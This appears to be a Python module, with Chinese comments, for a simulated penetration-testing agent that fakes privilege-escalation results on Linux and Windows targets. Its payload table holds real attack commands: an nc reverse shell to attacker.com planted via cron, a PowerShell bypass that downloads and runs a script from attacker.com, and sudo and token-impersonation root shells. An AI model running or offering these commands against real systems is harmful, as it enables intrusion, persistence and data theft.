# -*- coding: utf-8 -*-
#!/usr/bin/env python3
"""
PrivilegeEscalationSkill - 权限提升技能

功能：
1. 系统权限提升检测
2. 提权漏洞利用
3. 管理员/root权限获取
"""

import random
import time
from typing import Dict, List, Any
from .base_skill import BaseSkill


class PrivilegeEscalationSkill(BaseSkill):
    """权限提升技能"""
    
    def get_name(self) -> str:
        return "PrivilegeEscalationSkill"
    
    def get_description(self) -> str:
        return "检测和利用系统权限提升漏洞，获取管理员/root权限"
    
    def get_category(self) -> str:
        return "post_exploitation"
    
    def get_difficulty(self) -> str:
        return "expert"
    
    def get_required_tools(self) -> List[str]:
        return ["linpeas", "winpeas", "metasploit", "custom_scripts"]
    
    def get_prerequisites(self) -> List[str]:
        return ["NmapScanSkill", "RCESkill"]  # 需要先进行端口扫描和获取系统访问
    
    def get_success_rate(self) -> float:
        """获取技能成功率"""
        return 0.50  # 权限提升成功率较低
    
    def get_estimated_time(self) -> str:
        """获取预估执行时间"""
        return "20-40分钟"
    
    def can_handle(self, context: Dict[str, Any]) -> bool:
        """
        判断是否能处理当前上下文
        
        条件：
        1. 有目标地址
        2. 已获取系统访问权限（通过RCE或其他方式）
        3. 当前权限不是root/administrator
        4. 尚未进行权限提升或需要深度提权
        """
        if not context:
            return False
        
        target = context.get("target", "")
        if not target:
            return False
        
        # 检查是否已获取系统访问
        current_state = context.get("current_state", {})
        
        # 检查是否有系统访问信息
        has_system_access = False
        access_level = "unknown"
        
        # 从RCE结果检查
        if "rce_vulnerabilities" in current_state:
            rce_vulns = current_state["rce_vulnerabilities"]
            if isinstance(rce_vulns, list) and len(rce_vulns) > 0:
                for vuln in rce_vulns:
                    if isinstance(vuln, dict) and vuln.get("exploited", False):
                        has_system_access = True
                        break
        
        # 从系统访问信息检查
        if "system_access" in current_state:
            system_access = current_state["system_access"]
            if isinstance(system_access, dict) and system_access.get("access_obtained", False):
                has_system_access = True
                access_level = system_access.get("access_level", "unknown")
        
        if not has_system_access:
            return False
        
        # 检查当前权限级别
        # 如果已经是root/administrator，可能不需要提权
        if access_level in ["root", "administrator", "system"]:
            # 检查是否需要深度提权（例如，从administrator到system）
            if access_level == "administrator" and random.random() > 0.7:  # 30%概率尝试深度提权
                return True
            return False
        
        # 检查是否已进行过权限提升
        if "privilege_escalation" in current_state:
            priv_esc = current_state["privilege_escalation"]
            if isinstance(priv_esc, dict) and priv_esc.get("success", False):
                # 已成功提权，检查是否需要进一步提权
                if priv_esc.get("final_privilege") in ["root", "administrator", "system"]:
                    return False
                # 提权但未达到最高权限，可以继续尝试
                return True
        
        # 默认情况下，如果有系统访问但不是最高权限，可以尝试提权
        return True
    
    def execute(self, context: Dict[str, Any]) -> Dict[str, Any]:
        """
        执行权限提升检测和利用
        
        模拟执行，实际环境中应调用真实工具
        """
        target = context.get("target", "")
        
        if not target:
            return {
                "success": False,
                "error": "缺少目标地址",
                "skill_name": self.name
            }
        
        try:
            # 模拟提权过程
            self._simulate_escalation(target)
            
            # 生成模拟结果
            escalation_result = self._generate_privilege_escalation_result(target, context)
            
            return {
                "success": True,
                "skill_name": self.name,
                "target": target,
                "privilege_escalation": escalation_result["escalation_info"],
                "vulnerabilities_found": escalation_result["vulnerabilities"],
                "exploitation_results": escalation_result["exploitation_results"],
                "final_privileges": escalation_result["final_privileges"],
                "scan_time": escalation_result["scan_time"],
                "details": {
                    "tools_used": ["linpeas", "winpeas", "metasploit", "custom_scripts"],
                    "techniques": ["enumeration", "vulnerability_scanning", "exploit_development"],
                    "system_type": escalation_result.get("system_type", "unknown")
                }
            }
            
        except Exception as e:
            return {
                "success": False,
                "error": f"权限提升失败: {str(e)}",
                "skill_name": self.name,
                "target": target
            }
    
    def _simulate_escalation(self, target: str) -> None:
        """模拟提权过程"""
        # 权限提升通常需要时间
        scan_time = random.uniform(10.0, 30.0)
        time.sleep(min(scan_time, 2.0))  # 实际等待时间缩短
    
    def _generate_privilege_escalation_result(self, target: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """生成模拟的权限提升结果"""
        
        # 从上下文获取系统信息
        system_type = self._determine_system_type(context)
        
        # 生成提权信息
        escalation_info = self._generate_escalation_info(system_type)
        
        # 生成发现的漏洞
        vulnerabilities = self._generate_vulnerabilities(system_type)
        
        # 生成利用结果
        exploitation_results = self._generate_exploitation_results(vulnerabilities, system_type)
        
        # 生成最终权限
        final_privileges = self._generate_final_privileges(exploitation_results, system_type)
        
        return {
            "escalation_info": escalation_info,
            "vulnerabilities": vulnerabilities,
            "exploitation_results": exploitation_results,
            "final_privileges": final_privileges,
            "system_type": system_type,
            "scan_time": f"{random.uniform(9.5, 28.3):.1f} seconds"
        }
    
    def _determine_system_type(self, context: Dict[str, Any]) -> str:
        """确定系统类型"""
        
        current_state = context.get("current_state", {})
        
        # 从系统访问信息推断
        if "system_access" in current_state:
            system_access = current_state["system_access"]
            if isinstance(system_access, dict):
                system_info = system_access.get("system_info", {})
                os_type = system_info.get("os", "").lower()
                
                if "linux" in os_type:
                    return "Linux"
                elif "windows" in os_type:
                    return "Windows"
                elif "unix" in os_type:
                    return "Unix"
        
        # 从端口信息推断
        if "open_ports" in current_state:
            for port_info in current_state["open_ports"]:
                if isinstance(port_info, dict):
                    service = port_info.get("service", "").lower()
                    if "ssh" in service:
                        return "Linux"  # SSH通常用于Linux
                    elif "rdp" in service or "ms-wbt-server" in service:
                        return "Windows"  # RDP通常用于Windows
        
        # 从技术栈推断
        if "web_technologies" in current_state:
            tech_stack = current_state["web_technologies"]
            server = tech_stack.get("server", [])
            
            server_str = str(server).lower()
            if "iis" in server_str or "windows" in server_str:
                return "Windows"
            elif "apache" in server_str or "nginx" in server_str:
                return "Linux"
        
        # 随机选择
        return random.choice(["Linux", "Windows"])
    
    def _generate_escalation_info(self, system_type: str) -> Dict[str, Any]:
        """生成提权信息"""
        
        if system_type == "Linux":
            return {
                "initial_privilege": random.choice(["www-data", "apache", "nginx", "user"]),
                "target_privilege": "root",
                "escalation_method": random.choice(["kernel_exploit", "sudo_misconfiguration", "suid_binary", "cron_job"]),
                "tools_used": ["linpeas", "linux-exploit-suggester", "custom_scripts"],
                "enumeration_completed": True,
                "system_info_collected": True
            }
        else:  # Windows
            return {
                "initial_privilege": random.choice(["user", "guest", "iis_apppool"]),
                "target_privilege": "SYSTEM",
                "escalation_method": random.choice(["token_impersonation", "service_misconfiguration", "dll_hijacking", "unquoted_service_path"]),
                "tools_used": ["winpeas", "windows-exploit-suggester", "powerup.ps1"],
                "enumeration_completed": True,
                "system_info_collected": True
            }
    
    def _generate_vulnerabilities(self, system_type: str) -> List[Dict[str, Any]]:
        """生成发现的漏洞"""
        
        vulnerabilities = []
        
        if system_type == "Linux":
            linux_vulns = [
                {
                    "name": "Dirty Pipe (CVE-2022-0847)",
                    "type": "kernel_exploit",
                    "severity": "critical",
                    "affected_kernel": "5.8 - 5.16.11, 5.15.25, 5.10.102",
                    "description": "Linux内核漏洞，允许任意文件写入，导致权限提升",
                    "exploit_available": True,
                    "complexity": "medium"
                },
                {
                    "name": "SUID Binary Misconfiguration",
                    "type": "misconfiguration",
                    "severity": "high",
                    "affected_binaries": ["find", "vim", "bash", "python"],
                    "description": "配置错误的SUID二进制文件，允许权限提升",
                    "exploit_available": True,
                    "complexity": "low"
                },
                {
                    "name": "Sudo Misconfiguration",
                    "type": "misconfiguration",
                    "severity": "high",
                    "affected_commands": ["/usr/bin/python", "/bin/bash", "/usr/bin/find"],
                    "description": "sudoers文件配置错误，允许以root权限执行命令",
                    "exploit_available": True,
                    "complexity": "low"
                },
                {
                    "name": "Cron Job Vulnerability",
                    "type": "misconfiguration",
                    "severity": "medium",
                    "description": "可写的cron作业脚本，允许权限提升",
                    "exploit_available": True,
                    "complexity": "low"
                }
            ]
            
            # 选择1-3个漏洞
            num_vulns = random.randint(1, 3)
            vulnerabilities = random.sample(linux_vulns, num_vulns)
            
        else:  # Windows
            windows_vulns = [
                {
                    "name": "PrintNightmare (CVE-2021-34527)",
                    "type": "service_vulnerability",
                    "severity": "critical",
                    "affected_versions": ["Windows 7 - 10", "Windows Server 2008 - 2019"],
                    "description": "Windows Print Spooler远程代码执行漏洞",
                    "exploit_available": True,
                    "complexity": "medium"
                },
                {
                    "name": "Token Impersonation",
                    "type": "token_manipulation",
                    "severity": "high",
                    "description": "通过令牌模拟提升权限",
                    "exploit_available": True,
                    "complexity": "medium"
                },
                {
                    "name": "Unquoted Service Path",
                    "type": "misconfiguration",
                    "severity": "medium",
                    "description": "服务路径未加引号，允许DLL劫持",
                    "exploit_available": True,
                    "complexity": "low"
                },
                {
                    "name": "AlwaysInstallElevated",
                    "type": "misconfiguration",
                    "severity": "high",
                    "description": "注册表设置允许以SYSTEM权限安装MSI包",
                    "exploit_available": True,
                    "complexity": "low"
                }
            ]
            
            # 选择1-3个漏洞
            num_vulns = random.randint(1, 3)
            vulnerabilities = random.sample(windows_vulns, num_vulns)
        
        return vulnerabilities
    
    def _generate_exploitation_results(self, vulnerabilities: List[Dict[str, Any]], system_type: str) -> List[Dict[str, Any]]:
        """生成利用结果"""
        
        exploitation_results = []
        
        for vuln in vulnerabilities:
            if vuln.get("exploit_available", False):
                # 模拟利用尝试
                exploit_success = random.random() > 0.4  # 60%成功率
                
                exploitation_result = {
                    "vulnerability": vuln["name"],
                    "exploit_attempted": True,
                    "exploit_successful": exploit_success,
                    "exploit_tool": self._get_exploit_tool(vuln["type"], system_type),
                    "payload_used": self._generate_escalation_payload(vuln["type"], system_type),
                    "execution_time": f"{random.uniform(3.5, 12.7):.1f} seconds"
                }
                
                if exploit_success:
                    exploitation_result["exploitation_details"] = {
                        "privilege_gained": "root" if system_type == "Linux" else "SYSTEM",
                        "method_used": vuln["type"],
                        "persistence_established": random.random() > 0.5,
                        "cleanup_performed": random.random() > 0.7
                    }
                else:
                    exploitation_result["exploitation_details"] = {
                        "failure_reason": random.choice([
                            "Exploit failed due to system patching",
                            "Target environment mismatch",
                            "Anti-virus detection",
                            "Network connectivity issues"
                        ])
                    }
                
                exploitation_results.append(exploitation_result)
        
        return exploitation_results
    
    def _get_exploit_tool(self, vuln_type: str, system_type: str) -> str:
        """获取利用工具"""
        
        tools = {
            "Linux": {
                "kernel_exploit": "custom_kernel_exploit",
                "sudo_misconfiguration": "sudo -u root",
                "suid_binary": "suid3num",
                "cron_job": "cron_exploit"
            },
            "Windows": {
                "service_vulnerability": "metasploit",
                "token_impersonation": "incognito",
                "misconfiguration": "powerup.ps1",
                "dll_hijacking": "custom_dll"
            }
        }
        
        return tools.get(system_type, {}).get(vuln_type, "custom_exploit")
    
    def _generate_escalation_payload(self, vuln_type: str, system_type: str) -> str:
        """生成提权payload"""
        
        if system_type == "Linux":
            payloads = {
                "kernel_exploit": "./dirtypipe-exploit /etc/passwd",
                "sudo_misconfiguration": "sudo /usr/bin/python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
                "suid_binary": "find / -perm -4000 2>/dev/null",
                "cron_job": "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f' > /etc/cron.d/exploit"
            }
        else:  # Windows
            payloads = {
                "service_vulnerability": "use exploit/windows/local/printnightmare",
                "token_impersonation": "incognito.exe execute -c \"NT AUTHORITY\\SYSTEM\" cmd.exe",
                "misconfiguration": "powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/PowerUp.ps1'); Invoke-AllChecks\"",
                "dll_hijacking": "copy malicious.dll C:\\Program Files\\VulnerableApp\\"
            }
        
        return payloads.get(vuln_type, "whoami /priv")
    
    def _generate_final_privileges(self, exploitation_results: List[Dict[str, Any]], system_type: str) -> Dict[str, Any]:
        """生成最终权限信息"""
        
        # 检查是否有成功的利用
        successful_exploits = [r for r in exploitation_results if r.get("exploit_successful", False)]
        
        if not successful_exploits:
            return {
                "escalation_successful": False,
                "current_privilege": "user",
                "target_privilege": "root" if system_type == "Linux" else "SYSTEM",
                "reason": "所有提权尝试均失败"
            }
        
        # 选择第一个成功的利用
        exploit = successful_exploits[0]
        details = exploit.get("exploitation_details", {})
        
        target_priv = "root" if system_type == "Linux" else "SYSTEM"
        
        return {
            "escalation_successful": True,
            "current_privilege": details.get("privilege_gained", target_priv),
            "target_privilege": target_priv,
            "method_used": details.get("method_used", "unknown"),
            "persistence_established": details.get("persistence_established", False),
            "cleanup_performed": details.get("cleanup_performed", False),
            "recommended_next_steps": ["lateral_movement", "data_exfiltration", "persistence_maintenance"]
        }
    
    def _extract_from_existing_scan(self, scan_results: Dict[str, Any]) -> Dict[str, Any]:
        """
        从现有扫描结果中提取权限提升信息
        """
        result = {
            "escalation_info": {},
            "vulnerabilities": [],
            "exploitation_results": [],
            "final_privileges": {}
        }
        
        # 提取权限提升相关信息
        if "privilege_escalation" in scan_results:
            priv_esc_data = scan_results["privilege_escalation"]
            if isinstance(priv_esc_data, dict):
                result["escalation_info"] = priv_esc_data
        
        # 提取漏洞信息
        if "nuclei" in scan_results:
            nuclei_data = scan_results["nuclei"]
            if isinstance(nuclei_data, dict) and "vulnerabilities" in nuclei_data:
                for vuln in nuclei_data["vulnerabilities"]:
                    if isinstance(vuln, dict):
                        vuln_name = vuln.get("name", "").lower()
                        if any(keyword in vuln_name for keyword in ["privilege", "escalation", "elevation", "sudo", "suid"]):
                            result["vulnerabilities"].append(vuln)
        
        return result
